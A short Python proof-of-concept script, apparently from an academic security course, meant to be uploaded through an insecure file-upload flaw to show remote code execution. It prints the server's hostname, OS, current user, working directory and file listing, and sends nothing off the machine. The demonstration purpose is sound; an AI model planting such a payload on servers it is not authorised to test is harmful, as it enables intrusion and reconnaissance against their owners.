"""
shell.py — Proof-of-Concept for V3 (Insecure File Upload)
Academic ISRM demonstration only. NOT for production use.

This script simply gathers system info to prove code execution.
"""

import os
import platform
import getpass
import socket

print("=" * 50)
print("  PoC: Remote Code Execution via File Upload")
print("=" * 50)
print(f"  Hostname  : {socket.gethostname()}")
print(f"  OS        : {platform.system()} {platform.release()}")
print(f"  User      : {getpass.getuser()}")
print(f"  CWD       : {os.getcwd()}")
print(f"  Directory : {os.listdir('.')}")
print("=" * 50)
print("  [!] This proves arbitrary code execution on the server.")
print("=" * 50)
